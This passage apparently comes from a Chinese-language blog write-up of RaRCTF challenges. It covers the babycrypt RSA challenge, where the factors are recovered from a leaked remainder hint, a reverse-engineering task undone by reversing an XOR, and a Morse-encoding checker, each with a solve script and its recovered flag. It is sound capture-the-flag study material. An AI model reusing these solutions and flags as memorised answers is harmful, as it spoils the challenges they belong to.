punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"error :("</span><span class="token punctuation">,</span> <span class="token string">"message too long"</span><span class="token punctuation">)</span>menu <span class="token operator">=</span> <span class="token triple-quoted-string string">"""[1] enc()[2] enc(flag)[3] quit"""</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>e<span class="token punctuation">,</span> n <span class="token operator">=</span> keygen<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"e: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"n: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>menu<span class="token punctuation">)</span>        opt <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"opt: "</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> opt <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">:</span>            encrypt<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"msg: "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>        <span class="token keyword">elif</span> opt <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">:</span>            encrypt<span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/challenge/flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>        <span class="token keyword">elif</span> opt <span class="token operator">==</span> <span class="token string">"3"</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bye"</span><span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"idk"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"error :("</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>低加密指数攻击不行，等wp了。。</p><h3 id="babycrypt-200-points"><a href="#babycrypt-200-points" class="headerlink" title="babycrypt (200 points)"></a>babycrypt (200 points)</h3><pre class="line-numbers language-题目描述" data-language="题目描述"><code class="language-题目描述">It&#39;s not a CTF without a baby RSA challenge right?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加密脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> bytes_to_longflag <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/challenge/flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">genkey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    e <span class="token operator">=</span> <span class="token number">0x10001</span>    p<span class="token punctuation">,</span> q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">,</span> getPrime<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> p <span class="token operator">&lt;=</span> q<span class="token punctuation">:</span>        p<span class="token punctuation">,</span> q <span class="token operator">=</span> q<span class="token punctuation">,</span> p    n <span class="token operator">=</span> p <span class="token operator">*</span> q    pubkey <span class="token operator">=</span> <span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    privkey <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span>    <span class="token keyword">return</span> pubkey<span class="token punctuation">,</span> privkey<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> pubkey<span class="token punctuation">)</span><span class="token punctuation">:</span>    e<span class="token punctuation">,</span> n <span class="token operator">=</span> pubkey    c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">return</span> cpubkey<span class="token punctuation">,</span> privkey <span class="token operator">=</span> genkey<span class="token punctuation">(</span><span class="token punctuation">)</span>c <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> pubkey<span class="token punctuation">)</span>hint <span class="token operator">=</span> pubkey<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token punctuation">(</span>privkey<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'pubkey:'</span><span class="token punctuation">,</span> pubkey<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hint:'</span><span class="token punctuation">,</span> hint<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'c:'</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很简单的一个题目，因为<code>hint = n mod (q - 1)</code>，故<code>hint = p*q mod (q - 1)</code>，而<code>q mod (q - 1) ≡ 1</code>故<code>hint = p mod (q - 1)</code>，而p与q的位数相同，并且hint作为余数也是n位数的一半，故hint一定是<code>p-q+1</code>或者<code>p-2*q+2</code>，只此两种情况，并且第一中的概率远大于第二种，由此获得p、q，解密很简单。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token keyword">import</span> gmpy2e<span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token number">65537</span><span class="token punctuation">,</span> <span class="token number">6628184042266335731321370671961552635546996386436824057232452529486304765936419737734405610719443213313324209318536703419108150359393106124187802348818781</span>hint <span class="token operator">=</span> <span class="token number">33727263134500228756141098597564119800249351596771642074985868183142729592181</span>c <span class="token operator">=</span> <span class="token number">2959835427452504752404208254683893987737026311666739247630497672047540799204271255724695589504155827189632581648446690898470108464270459301317572873769394</span><span class="token comment"># 猜测hint = p - (q - 1) 或 hint = p - 2(q - 1)，并且看hint的位数，第一种的可能性较大。</span><span class="token comment"># 1。—— hint = p - (q - 1) = p - q + 1</span>p_q <span class="token operator">=</span> hint <span class="token operator">-</span> <span class="token number">1</span>  <span class="token comment"># p-q</span>pq <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span>p_q <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> n<span class="token punctuation">)</span>  <span class="token comment"># p+q</span>p <span class="token operator">=</span> <span class="token punctuation">(</span>pq <span class="token operator">+</span> p_q<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>q <span class="token operator">=</span> n <span class="token operator">//</span> p<span class="token keyword">assert</span> p <span class="token operator">*</span> q <span class="token operator">==</span> nphi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># b'rarctf&#123;g3n3r1c_m4th5_equ4t10n_th1ng_ch4ll3ng3_5a174f54e6&#125;\n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="rev"><a href="#rev" class="headerlink" title="rev"></a>rev</h2><h3 id="verybabyrev-100-points"><a href="#verybabyrev-100-points" class="headerlink" title="verybabyrev (100 points)"></a>verybabyrev (100 points)</h3><pre class="line-numbers language-题目描述" data-language="题目描述"><code class="language-题目描述">fun fact: verybabyrev backwards is verybabyrev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>果然只是个简单的逆向。</p><p>伪代码如下</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  __int64 s1[12]; &#x2F;&#x2F; [rsp+0h] [rbp-100h] BYREF  char v4; &#x2F;&#x2F; [rsp+60h] [rbp-A0h]  char s[140]; &#x2F;&#x2F; [rsp+70h] [rbp-90h] BYREF  int v6; &#x2F;&#x2F; [rsp+FCh] [rbp-4h]  setvbuf(stdout, 0LL, 2, 0LL);  memset(s, 0, 0x80uLL);  s1[0] &#x3D; 0x45481D1217111313LL;  s1[1] &#x3D; 0x95F422C260B4145LL;  s1[2] &#x3D; 0x541B56563D6C5F0BLL;  s1[3] &#x3D; 0x585C0B3C2945415FLL;  s1[4] &#x3D; 0x402A6C54095D5F00LL;  s1[5] &#x3D; 0x4B5F4248276A0606LL;  s1[6] &#x3D; 0x6C5E5D432C2D4256LL;  s1[7] &#x3D; 0x6B315E434707412DLL;  s1[8] &#x3D; 0x5E54491C6E3B0A5ALL;  s1[9] &#x3D; 0x2828475E05342B1ALL;  s1[10] &#x3D; 0x60450073B26111FLL;  s1[11] &#x3D; 0xA774803050B0D04LL;  v4 &#x3D; 0;  printf(&quot;Enter your flag: &quot;);  fgets(s, 128, stdin);  v6 &#x3D; 0;  if ( s[0] !&#x3D; &#39;r&#39; )  &#123;    puts(&quot;Nope!&quot;);    exit(0);  &#125;  while ( v6 &lt;&#x3D; 126 )  &#123;    s[v6] ^&#x3D; s[v6 + 1];    ++v6;  &#125;  if ( !memcmp(s1, s, 0x61uLL) )  &#123;    puts(&quot;Correct!&quot;);    exit(1);  &#125;  puts(&quot;Nope!&quot;);  exit(0);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个又是涉及到大小端排序的，一开始我还没看出来。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>s1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">]</span>s1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0x45481D1217111313'</span>s1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0x095F422C260B4145'</span>s1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0x541B56563D6C5F0B'</span>s1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0x585C0B3C2945415F'</span>s1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0x402A6C54095D5F00'</span>s1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0x4B5F4248276A0606'</span>s1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0x6C5E5D432C2D4256'</span>s1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0x6B315E434707412D'</span>s1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0x5E54491C6E3B0A5A'</span>s1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0x2828475E05342B1A'</span>s1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token string">'0x060450073B26111F'</span>s1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token string">'0x0A774803050B0D04'</span>s <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s1<span class="token punctuation">:</span>    s <span class="token operator">+=</span> i<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"长度为: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token comment"># 两个占一个字节，189为奇数，故将a后补0</span>s <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp1 <span class="token operator">=</span> <span class="token string">'0x'</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span>    tmp1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>tmp1<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    tmp2 <span class="token operator">=</span> <span class="token string">'0x'</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span>    tmp2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>tmp2<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>tmp1 <span class="token operator">^</span> tmp2<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> tmp2<span class="token punctuation">)</span>flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># rarctf&#123;3v3ry_s1ngl3_b4by-r3v_ch4ll3ng3_u535_x0r-f0r_s0m3_r34s0n_4nd_1-d0nt_kn0w_why_dc37158365&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Dotty-150-points"><a href="#Dotty-150-points" class="headerlink" title="Dotty (150 points)"></a>Dotty (150 points)</h3><pre class="line-numbers language-题目描述" data-language="题目描述"><code class="language-题目描述">My new program will keep your secrets safe using military grade encryption!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>极其简单的c#的一个摩斯密码的编码小工具，不过有个check，所对应的值猜测即为flag的值，下面是反编译的程序</p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">&#x2F;&#x2F; Dotty.Checkinternal class Check&#123;public static string check &#x3D; &quot;-|....|.|&#x2F;|..-.|.-..|.-|--.|&#x2F;|..|...|&#x2F;|---|.---|--.-|-..-|.|-.--|...--|..-|--|--..|.....|.--|..|--|.-..|.|.-..|.....|....-|-|.-|.....|-.-|--...|---|.-|--..|-|--.|..---|..---|--...|--.|-...|--..|..-.|-....|-.|.-..|--.-|.--.|.|--...|-|-....|.--.|--..|--...|.-..|.....|-|--.|-.-.|-.|-..|-...|--|--|...--|-..|.-|-.|.-..|.....|&#x2F;|-...|.-|...|.|...--|..---&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">&#x2F;&#x2F; Dotty.Programusing System;using System.Collections.Generic;using System.Linq;using Dotty;internal class Program&#123;private static Dictionary&lt;char, string&gt; mapper &#x3D; new Dictionary&lt;char, string&gt;&#123;&#123;&#39; &#39;,&quot;&#x2F;&quot;&#125;,&#123;&#39;A&#39;,&quot;.-&quot;&#125;,&#123;&#39;B&#39;,&quot;-...&quot;&#125;,&#123;&#39;C&#39;,&quot;-.-.&quot;&#125;,&#123;&#39;D&#39;,&quot;-..&quot;&#125;,&#123;&#39;E&#39;,&quot;.&quot;&#125;,&#123;&#39;F&#39;,&quot;..-.&quot;&#125;,&#123;&#39;G&#39;,&quot;--.&quot;&#125;,&#123;&#39;H&#39;,&quot;....&quot;&#125;,&#123;&#39;I&#39;,&quot;..&quot;&#125;,&#123;&#39;J&#39;,&quot;.---&quot;&#125;,&#123;&#39;K&#39;,&quot;-.-&quot;&#125;,&#123;&#39;L&#39;,&quot;.-..&quot;&#125;,&#123;&#39;M&#39;,&quot;--&quot;&#125;,&#123;&#39;N&#39;,&quot;-.&quot;&#125;,&#123;&#39;O&#39;,&quot;---&quot;&#125;,&#123;&#39;P&#39;,&quot;.--.&quot;&#125;,&#123;&#39;Q&#39;,&quot;--.-&quot;&#125;,&#123;&#39;R&#39;,&quot;.-.&quot;&#125;,&#123;&#39;S&#39;,&quot;...&quot;&#125;,&#123;&#39;T&#39;,&quot;-&quot;&#125;,&#123;&#39;U&#39;,&quot;..-&quot;&#125;,&#123;&#39;V&#39;,&quot;...-&quot;&#125;,&#123;&#39;W&#39;,&quot;.--&quot;&#125;,&#123;&#39;X&#39;,&quot;-..-&quot;&#125;,&#123;&#39;Y&#39;,&quot;-.--&quot;&#125;,&#123;&#39;Z&#39;,&quot;--..&quot;&#125;,&#123;&#39;1&#39;,&quot;.----&quot;&#125;,&#123;&#39;2&#39;,&quot;..---&quot;&#125;,&#123;&#39;3&#39;,&quot;...--&quot;&#125;,&#123;&#39;4&#39;,&quot;....-&quot;&#125;,&#123;&#39;5&#39;,&quot;.....&quot;&#125;,&#123;&#39;6&#39;,&quot;-....&quot;&#125;,&#123;&#39;7&#39;,&quot;--...&quot;&#125;,&#123;&#39;8&#39;,&quot;---..&quot;&#125;,&#123;&#39;9&#39;,&quot;----.&quot;&#125;,&#123;&#39;0&#39;,&quot;-----&quot;&#125;&#125;;private static string Dotter(string phrase)&#123;return string.Join(&quot;|&quot;, from char c in phraseselect mapper[char.ToUpper(c)]);&#125;private static void Main(string[] args)&#123;Console.Write(&quot;Please enter your secret to encode: &quot;);string phrase &#x3D; Console.ReadLine();string text &#x3D; Dotter(phrase);if (text &#x3D;&#x3D; Check.check)&#123;Console.WriteLine(&quot;That&#39;s the right secret!&quot;);&#125;else&#123;Console.WriteLine(text);&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用python解一下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">MorseList <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">".-"</span><span class="token punctuation">:</span> <span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"-..."</span><span class="token punctuation">:</span> <span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token string">"-.-."</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token string">"-.."</span><span class="token punctuation">:</span> <span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">:</span> <span class="token string">"E"</span><span class="token punctuation">,</span> <span class="token string">"..-."</span><span class="token punctuation">:</span> <span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token string">"--."</span><span class="token punctuation">:</span> <span class="token string">"G"</span><span class="token punctuation">,</span>    <span class="token string">"...."</span><span class="token punctuation">:</span> <span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token string">".."</span><span class="token punctuation">:</span> <span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token string">".---"</span><span class="token punctuation">:</span> <span class="token string">"J"</span><span class="token punctuation">,</span> <span class="token string">"-.-"</span><span class="token punctuation">:</span> <span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token string">".-.."</span><span class="token punctuation">:</span> <span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token string">"--"</span><span class="token punctuation">:</span> <span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token string">"-."</span><span class="token punctuation">:</span> <span class="token string">"N"</span><span class="token punctuation">,</span>    <span class="token string">"---"</span><span class="token punctuation">:</span> <span class="token string">"O"</span><span class="token punctuation">,</span> <span class="token string">".--."</span><span class="token punctuation">:</span> <span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token string">"--.-"</span><span class="token punctuation">:</span> <span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token string">".-."</span><span class="token punctuation">:</span> <span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token string">"..."</span><span class="token punctuation">:</span> <span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">:</span> <span class="token string">"T"</span><span class="token punctuation">,</span>    <span class="token string">"..-"</span><span class="token punctuation">:</span> <span class="token string">"U"</span><span class="token punctuation">,</span> <span class="token string">"...-"</span><span class="token punctuation">:</span> <span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token string">".--"</span><span class="token punctuation">:</span> <span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token string">"-..-"</span><span class="token punctuation">:</span> <span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token string">"-.--"</span><span class="token punctuation">:</span> <span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token string">"--.."</span><span class="token punctuation">:</span> <span class="token string">"Z"</span><span class="token punctuation">,</span>    <span class="token string">"-----"</span><span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token string">".----"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"..---"</span><span class="token punctuation">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"...--"</span><span class="token punctuation">:</span> <span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"....-"</span><span class="token punctuation">:</span> <span class="token string">"4"</span><span class="token punctuation">,</span>    <span class="token string">"....."</span><span class="token punctuation">:</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"-...."</span><span class="token punctuation">:</span> <span class="token string">"6"</span><span class="token punctuation">,</span> <span class="token string">"--..."</span><span class="token punctuation">:</span> <span class="token string">"7"</span><span class="token punctuation">,</span> <span class="token string">"---.."</span><span class="token punctuation">:</span> <span class="token string">"8"</span><span class="token punctuation">,</span> <span class="token string">"----."</span><span class="token punctuation">:</span> <span class="token string">"9"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>data <span class="token operator">=</span> <span class="token string">"-|....|.|/|..-.|.-..|.-|--.|/|..|...|/|---|.---|--.-|-..-|.|-.--|...--|..-|--|--..|.....|.--|..|--|.-..|.|.-..|.....|....-|-|.-|.....|-.-|--...|---|.-|--..|-|--.|..---|..---|--...|--.|-...|--..|..-.|-....|-.|.-..|--.-|.--.|.|--...|-|-....|.--.|--..|--...|.-..|.....|-|--.|-.-.|-.|-..|-...|--|--|...--|-..|.-|-.|.-..|.....|/|-...|.-|...|.|...--|..---"</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span>    <span class="token string">'|'</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">!=</span> <span class="token string">'/'</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> MorseList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># FLAGIS OJQXEY3UMZ5WIMLEL54TA5K7OAZTG227GBZF6NLQPE7T6PZ7L5TGCNDBMM3DANL5 BASE32</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-flag" data-language="flag"><code 